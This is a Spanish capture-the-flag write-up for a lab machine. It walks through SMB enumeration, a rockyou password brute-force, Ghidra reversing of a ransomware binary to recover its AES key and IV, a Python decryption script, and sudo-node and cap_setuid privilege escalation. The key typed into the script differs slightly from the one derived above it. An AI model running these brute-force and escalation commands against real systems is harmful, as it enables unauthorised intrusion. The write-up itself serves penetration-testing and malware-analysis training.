### NOTA: 

Esta maquina contiene un ransomware! lo he creado de tal manera que si es ejecutado fuera de la maquina `raas` simplemente imprime el mensaje: `"Ten cuidado con lo que ejecutas!"`
el objetivo de esto es evitar posibles bloqueos de sistemas de los jugadores, igualmente la idea no es ejecutar el binario, sino analizarlo, a continuacion ejecuto siendo
`root` el binario en mi maquina local y solo imprime un texto


![image](https://github.com/user-attachments/assets/7b177287-3ad4-49dd-8e8c-3c1528c82870)



## Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

![image](https://github.com/user-attachments/assets/02876dce-6f7f-4796-ac52-21c33cbc34b8)

2 servicios corriendo, ssh y smb por lo que comienzo a enumerar el servicio smb

```ruby
enum4linux-ng -U 172.17.0.2
```
```bash
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 172.17.0.2
[*] Username ......... ''
[*] Random Username .. 'belqeali'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ===================================
|    Listener Scan on 172.17.0.2    |
 ===================================
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =======================================
|    SMB Dialect Check on 172.17.0.2    |
 =======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 =========================================================
|    Domain Information via SMB session for 172.17.0.2    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DOCKERLABS
NetBIOS domain name: ''
DNS domain: ''
FQDN: dockerlabs
Derived membership: workgroup member
Derived domain: unknown

 =======================================
|    RPC Session Check on 172.17.0.2    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'belqeali', password ''
[H] Rerunning enumeration with user 'belqeali' might give more results

 =================================================
|    Domain Information via RPC for 172.17.0.2    |
 =================================================
[+] Domain: WORKGROUP
[+] Domain SID: NULL SID
[+] Membership: workgroup member

 ===================================
|    Users via RPC on 172.17.0.2    |
 ===================================
[*] Enumerating users via 'querydispinfo'
[+] Found 3 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 3 user(s) via 'enumdomusers'
[+] After merging user results we have 3 user(s) total:
'1000':
  username: patricio
  name: ''
  acb: '0x00000010'
  description: ''
'1001':
  username: bob
  name: ''
  acb: '0x00000010'
  description: ''
'1002':
  username: calamardo
  name: ''
  acb: '0x00000010'
  description: ''

Completed after 0.58 seconds
```
obser varios usuarios: `patricio`, `bob` y `calamardo` asi que comienzo haciendo un ataque de diccionario para intentar dar con la password de algun usuario

```ruby
crackmapexec smb 172.17.0.2 -u patricio -p /usr/share/wordlists/rockyou.txt |grep -v 'STATUS_LOGON_FAILURE'
```

![image](https://github.com/user-attachments/assets/40a569f5-30f4-4725-9679-5cbb45488fb0)

doy con las credenciales de `patricio` asi que consulto los recursos compartidos

```ruby
smbmap -u 'patricio' -p 'basketball' -H 172.17.0.2
```

![image](https://github.com/user-attachments/assets/72c601ae-1a63-47ae-8c62-fa9258df6257)

![image](https://github.com/user-attachments/assets/102fa732-de49-420f-86d5-bc4c5f01321f)

me descargo `nota.txt`

```ruby
smbclient //172.17.0.2/ransomware -U patricio%basketball
```

![image](https://github.com/user-attachments/assets/5155f197-d62f-401a-abf1-802636d83ba4)

parece que `pokemongo` es un `ransomware` y `private.txt` parece tener informacion importante asi que descargo tanto el binario como `private.txt`

![image](https://github.com/user-attachments/assets/fe6a9de3-2141-4f4f-bdbc-b97b81007ead)

ahora para intentar desencriptar el archivo `private.txt` es necesario hacerle reversing al binario (no ejecutar!), por lo que hago reversing con `ghidra`

## Reversing pokemongo

![image](https://github.com/user-attachments/assets/bf3d5497-1c3d-4296-8b11-ad79ad8f8c69)

lo primero que necesito conocer es bajo que algoritmo cifra este `ransomware`

![image](https://github.com/user-attachments/assets/11ffcd04-98eb-45db-a6b8-e751897dc125)

al ir hasta la funcion `encrypt` puedo ver que hace uso de `AES-256-CBC`, dicho algoritmo necesita para el cifrado y descifrado una `key` y un vector de inicializacion `IV`
donde la `key` debe ser de 32 byte y el `IV` debe ser de 16 byte, si esta informacion se encuentra en el binario seria posible localizarlos y llegar a desencriptar
los archivos, en caso de que estos valores sean cargados desde el exterior habria que analizar desde donde los obtiene y si es posible conseguirlos...

![image](https://github.com/user-attachments/assets/1aa0c203-36c5-402c-84a1-e8bba0b4e2cb)

analizando este fragmento de codigo en la funcion `main`, veo que el binario realiza varias comprobaciones para continuar, por lo que pinta es un ataque dirigido, 
si continuamos analizando el codigo un poco mas abajo se observan 2 variables `local_438` & `local_430` que si paso sus valores de hex a char queda:

![image](https://github.com/user-attachments/assets/b02299fb-534c-4a40-b1bb-fe387bdaea89)

`local_438 = 87654321` & `local_430 = 65432109` si las concateno quedaria `1234567890123456` (recordemos que debe revertirse el orden) y casualmente esto cumple con
el `IV` que debe ser de 16 byte (el motivo por el cual uno el valor de estas 2 variables es porque se almacenan en direcciones de memoria una tras la otra con una separacion de 8 bytes),
podria ser el `IV` mas aun no es seguro, asi que continuo chequeando y despues observo una funcion llamada `recon` 

![image](https://github.com/user-attachments/assets/fc66534a-dfac-47c3-99f5-cd81afb68899)

aqui parece ser que se almacena informacion por lo que la pasare a texto claro

![image](https://github.com/user-attachments/assets/68b11cf3-c3b2-4da7-a7ba-cfd7f5c1d3ea)

para que se pueda observar mejor, codigo asm


```asm
        001012f9 48 89 7d f8     MOV        qword ptr [RBP + local_10],param_1
        001012fd 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
        00101301 c7 00 79        MOV        dword ptr [RAX],"pq0y"
                 30 71 70
        00101307 c6 40 04 00     MOV        byte ptr [RAX + 0x4],0x0
        0010130b 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
        0010130f 48 89 c7        MOV        param_1,RAX
        00101312 e8 49 fd        CALL       <EXTERNAL>::strlen                               size_t strlen(char * __s)
                 ff ff
        00101317 48 89 c2        MOV        RDX,RAX
        0010131a 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
        0010131e 48 01 d0        ADD        RAX,RDX
        00101321 c7 00 66        MOV        dword ptr [RAX],"bxjf"
                 6a 78 62
        00101327 66 c7 40        MOV        word ptr [RAX + 0x4],'d'
                 04 64 00
        0010132d 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
        00101331 48 89 c7        MOV        param_1,RAX
        00101334 e8 27 fd        CALL       <EXTERNAL>::strlen                               size_t strlen(char * __s)
                 ff ff
        00101339 48 89 c2        MOV        RDX,RAX
        0010133c 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
        00101340 48 01 d0        ADD        RAX,RDX
        00101343 c7 00 37        MOV        dword ptr [RAX],"4097"
                 39 30 34
        00101349 66 c7 40        MOV        word ptr [RAX + 0x4],'7'
                 04 37 00
        0010134f 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
        00101353 48 89 c7        MOV        param_1,RAX
        00101356 e8 05 fd        CALL       <EXTERNAL>::strlen                               size_t strlen(char * __s)
                 ff ff
        0010135b 48 89 c2        MOV        RDX,RAX
        0010135e 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
        00101362 48 01 d0        ADD        RAX,RDX
        00101365 c7 00 39        MOV        dword ptr [RAX],"e929"
                 32 39 65
        0010136b 66 c7 40        MOV        word ptr [RAX + 0x4],'w'
                 04 77 00
        00101371 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
        00101375 48 89 c7        MOV        param_1,RAX
        00101378 e8 e3 fc        CALL       <EXTERNAL>::strlen                               size_t strlen(char * __s)
                 ff ff
        0010137d 48 89 c2        MOV        RDX,RAX
        00101380 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
        00101384 48 01 d0        ADD        RAX,RDX
        00101387 48 b9 30        MOV        RCX,"f3daqmo0"
                 6f 6d 71 
                 61 64 33 66
        00101391 48 89 08        MOV        qword ptr [RAX],RCX
        00101394 c6 40 08 00     MOV        byte ptr [RAX + 0x8],0x0
        00101398 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
        0010139c 48 89 c7        MOV        param_1,RAX
        0010139f e8 bc fc        CALL       <EXTERNAL>::strlen                               size_t strlen(char * __s)
                 ff ff
        001013a4 48 89 c2        MOV        RDX,RAX
        001013a7 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
        001013ab 48 01 d0        ADD        RAX,RDX
        001013ae c7 00 34        MOV        dword ptr [RAX],"csg4"
                 67 73 63
        001013b4 66 c7 40        MOV        word ptr [RAX + 0x4],'l'
                 04 6c 00
```

extrayendo la informacion en el mismo orden que es presentada obtenemos:

```bash
pq0y bxjf d 40977 e929 w f3daqmo0 csg4 l
```
sin embargo recordemos que esta informacion se almacena invertida por lo que debemos revertirlo

```bash
y0qp fjxb d 77904 929e w 0omqad3f 4gsc l
```
un detalle que observamos aqui es que esta cadena cumple con que la `key` debe ser de 32 byte

```bash
cadena de 32 byte presumiblemente la key
y0qpfjxbd77904929ew0omqad3f4gscl
```
teniendo presuntamente el valor `key` y el valor `IV` creare un script en python para intentar desencriptar el archivo `private.txt`

```ruby
nano decript.py
```
```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# key & IV presumibles 
key = b'y0qpfjxbd79047929ew0omqad3f4gscl'
iv = b'1234567890123456'

# Leo el archivo encriptado
with open('private.txt', 'rb') as f:
    encrypted_data = f.read()

# Creo un objeto cifrador
cipher = AES.new(key, AES.MODE_CBC, iv)

# Desencripto los datos
try:
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    # Guardar los datos desencriptados en un archivo
    with open('decrypted_file.bin', 'wb') as f:
        f.write(decrypted_data)
    print("Desencriptación completada con éxito.")
except ValueError as e:
    print(f"Error al desencriptar los datos: {e}")
```
y ejecuto el script, si llega dar error (que me dio error) se debe instalar la biblioteca `pycryptodome` y si estas haciendo uso de kali, tendras que hacer
la instalacion desde un entorno virtual

```bash
source /home/darks/Desktop/myenv/bin/activate # activando mi entorno virtual
```

```bash
pip install pycryptodome # instalacion de la biblioteca
```

```bash
pip list |grep pycryptodome # validando que este instalado
```

```bash
python3 decript.py # ejecutando el script para desencriptar!
```

```bash
deactivate # salgo del entorno virtual
```


![image](https://github.com/user-attachments/assets/5dd21b8b-e057-4c9c-9906-36a819a2399e)


logre desencriptar la informacion, estaba casi seguro que eran los datos correctos porque despues de examinar durante mucho tiempo el codigo decompilado
no pude dar con mas informacion, asi que he conseguido credenciales ssh

![image](https://github.com/user-attachments/assets/6e3acf4e-3cf7-497b-bc23-55f8bda5973c)


## Escalada de privilegios

### bob

```ruby
sudo -l
```

![image](https://github.com/user-attachments/assets/d4afc295-495b-410f-b5ff-a0a51912be95)

veo que puedo ejecutar `node` como el user `calamardo` asi que si busco el binario en `GTFOBINS` veo como puedo hacer la escalada

![image](https://github.com/user-attachments/assets/44544116-85ce-4b46-94f6-10f29434274e)

```ruby
sudo -u calamardo /bin/node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
```

![image](https://github.com/user-attachments/assets/bf15ea8d-24bc-46ba-97c1-2acc679e2748)

### calamardo

estuve buen rato con este usuario buscando como escalar y no conseguia nada hasta que lei `.bashrc` donde se escondian credenciales para el user `patricio`

![image](https://github.com/user-attachments/assets/f5611b49-684d-401b-bfda-e93b837958d9)

```bash
su patricio
```

### patricio

con este usuario tambien estuve buen rato buscando manera de escalar, pero al revisar el direccion `.ssh` veo que se encuentra el binario `python3` lo cual es extrano
debido a que no es el lugar donde debe estar dicho binario

![image](https://github.com/user-attachments/assets/e9b27f8a-78d9-431c-8033-e4a1c3cc8901)

lo puedo ejecutar sin problemas pero no tiene bit suid activo, pero tras chequear las capacidades

```ruby
getcap .ssh/python3

.ssh/python3 cap_setuid=ep
```

y si busco el binario en GTFOBINS 

![image](https://github.com/user-attachments/assets/e1c3514f-e7d0-4e6d-9b1d-87746585c410)

vemos la forma de aprovecharlo para escalar

![image](https://github.com/user-attachments/assets/1c98b6a3-a162-40a8-92f8-8f0d05698e5b)

parcialmente he escalado a `root`, pero para escalar completamente simplemente le asignare nueva password a `root`

![image](https://github.com/user-attachments/assets/6f568cb7-0b29-41c7-85d2-2e8f3613236c)

### PWNED-ROOT









